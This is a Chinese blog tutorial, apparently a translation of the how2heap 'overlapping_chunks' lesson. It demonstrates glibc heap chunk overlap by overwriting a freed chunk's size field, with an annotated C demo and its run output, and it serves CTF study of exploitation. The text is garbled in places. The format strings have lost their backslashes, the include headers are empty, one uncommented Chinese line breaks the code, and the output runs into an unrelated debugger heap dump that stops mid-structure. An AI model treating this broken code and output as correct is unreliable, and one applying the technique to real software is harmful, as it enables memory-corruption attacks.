# how2heap之overlapping1/2
|
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
> 欢迎各位喜欢安全的小伙伴们加入星盟安全 UVEgZ3JvdXA6IDU3MDI5NTQ2MQ==
>
> 接上一篇的unink
PS:由于本人才疏学浅,文中可能会有一些理解的不对的地方,欢迎各位斧正 🙂
## 参考网站
    https://ctf-wiki.github.io/ctf-wiki/
## 0x0 overlapping_chunk
###  序
overlapping在平常算是最常用的技巧了,几乎每一道题都需要构造overlap
而提到overlapping就不得不说chunk shrink和chunk
extend了,其实这两个都是依靠更改chunk的pre_size域和size域来欺骗ptmalloc的
详情可见,[文章一](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/chunk_extend_overlapping-zh/#4extendoverlapping),[文章二](https://nightrainy.github.io/2019/07/25/chunk-extend-and-overlapping/)
好了,回过来,我们继续看本例
###  源代码
我们还是先看源代码吧,同样的,我删了写东西并加了一小点翻译(雾
    #include 
    #include 
    #include 
    #include 
    int main(int argc , char* argv[]){
            intptr_t *p1,*p2,*p3,*p4;
            p1 = malloc(0x100 - 8);
            p2 = malloc(0x100 - 8);
            p3 = malloc(0x80 - 8);
            fprintf(stderr, "The 3 chunks have been allocated here:np1=%pnp2=%pnp3=%pn", p1, p2, p3);
            memset(p1, '1', 0x100 - 8);
            memset(p2, '2', 0x100 - 8);
            memset(p3, '3', 0x80 - 8);
            free(p2);
            // p2现在在unsorted bin中,时刻准备为新的malloc服务
            fprintf(stderr, "The chunk p2 is now in the unsorted bin ready to serve possiblennew malloc() of its sizen");                   
            // 现在模拟一下溢出来覆写p2的size                                                                               
            fprintf(stderr, "Now let's simulate an overflow that can overwrite the size of thenchunk freed p2.n");     
            //对实例程序而言,最后三个字节是什么并不重要,然而,我们最好还是维持一下堆的稳定性
            fprintf(stderr, "For a toy program, the value of the last 3 bits is unimportant;"
                    " however, it is best to maintain the stability of the heap.n");
            //为了维持堆的稳定性,我们还是要把prev_inuse标志位设位1来确保我们的p1不会被错误的认为是一个free chunk
            fprintf(stderr, "To achieve this stability we will mark the least signifigant bit as 1 (prev_inuse),"
                    " to assure that p1 is not mistaken for a free chunk.n");
            int evil_chunk_size = 0x181;
            int evil_region_size = 0x180 - 8;
            fprintf(stderr, "We are going to set the size of chunk p2 to to %d, which gives usna region size of %dn",                                                                                                                       evil_chunk_size, evil_region_size);
            *(p2-1) = evil_chunk_size; // we are overwriting the "size" field of chunk p2
            //现在我们分配一个和p2被注入的size一样的大小的chunk
            fprintf(stderr, "nNow let's allocate another chunk with a size equal to the datan"
                   "size of the chunk p2 injected sizen");
            这次的malloc将会从我们刚刚修改过size的unsoted bin中取出free chunk
            fprintf(stderr, "This malloc will be served from the previously freed chunk thatn"
                   "is parked in the unsorted bin which size has been modified by usn");
            p4 = malloc(evil_region_size);
            fprintf(stderr, "np4 has been allocated at %p and ends at %pn", (char *)p4, (char *)p4+evil_region_size);
            fprintf(stderr, "p3 starts at %p and ends at %pn", (char *)p3, (char *)p3+0x80-8);
            fprintf(stderr, "p4 should overlap with p3, in this case p4 includes all p3.n");
            //现在我们写进p4的内容就可以覆盖p3啦,同时,我们写到p3里的内容也可以修改p4的内容
            fprintf(stderr, "nNow everything copied inside chunk p4 can overwrites data onnchunk p3,"
                    " and data written to chunk p3 can overwrite datanstored in the p4 chunk.nn");
            fprintf(stderr, "Let's run through an example. Right now, we have:n");
            fprintf(stderr, "p4 = %sn", (char *)p4);
            fprintf(stderr, "p3 = %sn", (char *)p3);
            fprintf(stderr, "nIf we memset(p4, '4', %d), we have:n", evil_region_size);
            memset(p4, '4', evil_region_size);
            fprintf(stderr, "p4 = %sn", (char *)p4);
            fprintf(stderr, "p3 = %sn", (char *)p3);
            fprintf(stderr, "nAnd if we then memset(p3, '3', 80), we have:n");
            memset(p3, '3', 80);
            fprintf(stderr, "p4 = %sn", (char *)p4);
            fprintf(stderr, "p3 = %sn", (char *)p3);
    }
###  运行结果
    This is a simple chunks overlapping problem
    Let's start to allocate 3 chunks on the heap
    The 3 chunks have been allocated here:
    p1=0x7aa010
    p2=0x7aa110
    p3=0x7aa210
    Now let's free the chunk p2
    The chunk p2 is now in the unsorted bin ready to serve possible
    new malloc() of its size
    Now let's simulate an overflow that can overwrite the size of the
    chunk freed p2.
    For a toy program, the value of the last 3 bits is unimportant; however, it is best to maintain the stability of the heap.
    To achieve this stability we will mark the least signifigant bit as 1 (prev_inuse), to assure that p1 is not mistaken for a free chunk.
    We are going to set the size of chunk p2 to to 385, which gives us
    a region size of 376
    Now let's allocate another chunk with a size equal to the data
    size of the chunk p2 injected size
    This malloc will be served from the previously freed chunk that
    is parked in the unsorted bin which size has been modified by us
    p4 has been allocated at 0x7aa110 and ends at 0x7aa288
    p3 starts at 0x7aa210 and ends at 0x7aa288
    p4 should overlap with p3, in this case p4 includes all p3.
    Now everything copied inside chunk p4 can overwrites data on
    chunk p3, and data written to chunk p3 can overwrite data
    stored in the p4 chunk.
    Let's run through an example. Right now, we have:
    p4 = xK heap
    0x603000 PREV_INUSE {
      prev_size = 0,
      size = 257,
      fd = 0x0,
      bk = 0x0,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
    0x603100 PREV_INUSE {
      prev_size = 0,
      size = 257,
      fd = 0x0,
      bk = 0x0,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
    0x603200 FASTBIN {
      prev_size = 0,
      size = 129,
      fd = 0x0,
      bk = 0x0,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
    0x603280 PREV_INUSE {
      prev_size = 0,